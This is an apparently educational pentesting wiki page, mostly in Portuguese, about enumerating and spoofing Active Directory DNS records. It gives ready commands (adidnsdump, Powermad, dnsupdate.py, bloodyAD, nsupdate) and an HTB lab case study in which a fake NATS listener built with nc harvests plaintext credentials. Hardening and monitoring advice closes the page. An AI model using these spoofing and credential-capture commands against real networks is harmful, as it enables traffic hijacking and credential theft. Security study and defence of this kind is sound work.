# Registros DNS do AD

{{#include ../../banners/hacktricks-training.md}}

Por padrão **qualquer usuário** no Active Directory pode **enumerar todos os registros DNS** nas zonas DNS do Domínio ou da Floresta, semelhante a uma transferência de zona (usuários podem listar os objetos filhos de uma zona DNS em um ambiente AD).

A ferramenta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite a **enumeração** e **exportação** de **todos os registros DNS** na zona para fins de reconhecimento de redes internas.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) adiciona saída JSON/Greppable (`--json`), resolução DNS multithread e suporte a TLS 1.2/1.3 ao ligar-se ao LDAPS

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Criando / Modificando registros (ADIDNS spoofing)

Como o grupo **Authenticated Users** tem **Create Child** no zone DACL por padrão, qualquer conta de domínio (ou conta de computador) pode registrar registros adicionais. Isso pode ser usado para sequestrar tráfego, NTLM relay coercion ou até mesmo comprometimento total do domínio.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py vem com Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitivas de ataque comuns

1. **Wildcard record** – `*.<zone>` transforma o servidor AD DNS em um responder em toda a empresa, semelhante ao LLMNR/NBNS spoofing. Pode ser abusado para capturar hashes NTLM ou para retransmiti-los para LDAP/SMB. (Requer que o WINS-lookup esteja desabilitado.)
2. **WPAD hijack** – adicione `wpad` (ou um **NS** record apontando para um host atacante para contornar a Global-Query-Block-List) e faça proxy transparente de requisições HTTP de saída para coletar credenciais. A Microsoft corrigiu os bypasses wildcard/DNAME (CVE-2018-8320), mas **NS-records still work**.
3. **Stale entry takeover** – reivindique o endereço IP que anteriormente pertencia a uma workstation e a entrada DNS associada ainda irá resolver, permitindo ataques de resource-based constrained delegation ou Shadow-Credentials sem tocar no DNS.
4. **DHCP → DNS spoofing** – em uma implantação Windows DHCP+DNS padrão, um atacante não autenticado na mesma subnet pode sobrescrever qualquer A record existente (incluindo Domain Controllers) enviando requisições DHCP forjadas que disparam atualizações dinâmicas de DNS (Akamai “DDSpoof”, 2023). Isso permite machine-in-the-middle sobre Kerberos/LDAP e pode levar a takeover completo do domínio.
5. **Certifried (CVE-2022-26923)** – altere o `dNSHostName` de uma conta de máquina que você controla, registre um A record correspondente e então solicite um certificado para esse nome para se passar pelo DC. Ferramentas como **Certipy** ou **BloodyAD** automatizam totalmente o fluxo.

---

### Internal service hijacking via stale dynamic records (NATS case study)

Quando atualizações dinâmicas permanecem abertas a todos os usuários autenticados, **um nome de serviço desregistrado pode ser reivindicado novamente e apontado para infraestrutura atacante**. O Mirage HTB DC expôs o hostname `nats-svc.mirage.htb` após o DNS scavenging, então qualquer usuário com poucos privilégios poderia:

1. **Confirmar que o registro está ausente** e descobrir o SOA com `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Recriar o registro** em direção a uma interface externa/VPN que eles controlam:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Personificar o serviço em texto simples**. Clientes NATS esperam ver um banner `INFO { ... }` antes de enviarem credenciais, então copiar um banner legítimo do broker real é suficiente para coletar segredos:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any cliente que resolver o nome sequestrado vazará imediatamente seu frame JSON `CONNECT` (incluindo `"user"`/`"pass"`) para o listener. Executar o binário oficial `nats-server -V` no host do atacante, desabilitar sua redacção de logs, ou simplesmente sniffar a sessão com Wireshark produz as mesmas credenciais em plaintext porque o TLS era opcional.

4. **Pivot with the captured creds** – in Mirage a conta NATS roubada forneceu acesso ao JetStream, que expôs eventos históricos de autenticação contendo nomes de usuário/senhas AD reutilizáveis.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Detecção & hardening

* Deny **Authenticated Users** the *Create all child objects* right on sensitive zones and delegate dynamic updates to a dedicated account used by DHCP.
* If dynamic updates are required, set the zone to **Secure-only** and enable **Name Protection** in DHCP so that only the owner computer object can overwrite its own record.
* Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) and LDAP writes to `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Block dangerous names (`wpad`, `isatap`, `*`) with an intentionally-benign record or via the Global Query Block List.
* Keep DNS servers patched – e.g., RCE bugs CVE-2024-26224 and CVE-2024-26231 reached **CVSS 9.8** and are remotely exploitable against Domain Controllers.



## References

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, ainda a referência de facto para ataques wildcard/WPAD)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
